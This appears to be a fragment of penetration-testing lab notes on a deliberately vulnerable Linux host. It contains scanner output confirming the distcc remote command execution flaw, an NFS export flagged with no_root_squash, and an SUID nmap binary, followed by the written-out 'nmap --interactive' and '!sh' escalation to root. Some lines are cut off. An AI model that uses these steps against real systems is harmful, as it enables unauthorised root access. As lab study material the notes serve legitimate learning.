
PORT     STATE SERVICE  
3632/tcp open  distccd  
| distcc-cve2004-2687:    
|   VULNERABLE:  
|   distcc Daemon Command Execution  
|     State: VULNERABLE (Exploitable)  
|     IDs:  CVE:CVE-2004-2687  
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)  
|       Allows executing of arbitrary commands on systems running distccd 3.1 and  
|       earlier. The vulnerability is the consequence of weak service configuration.  
|          
|     Disclosure date: 2002-02-01  
|     Extra information:  
|          
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)  
|      
|     References:  
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687  
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687  
|_      ht


╔══════════╣ Analyzing NFS Exports Files (limit 70)  
Connected NFS Mounts:    
rpc_pipefs /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0  
nfsd /proc/fs/nfsd nfsd rw,rz<elatime 0 0  
-rw-r--r-- 1 root root 367 May 13  2012 
/etc/exports/       *(rw,sync,**no_root_squash**,no_subtree_check)

SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap

`nmap --interactive`

`!sh`

`now root :3`

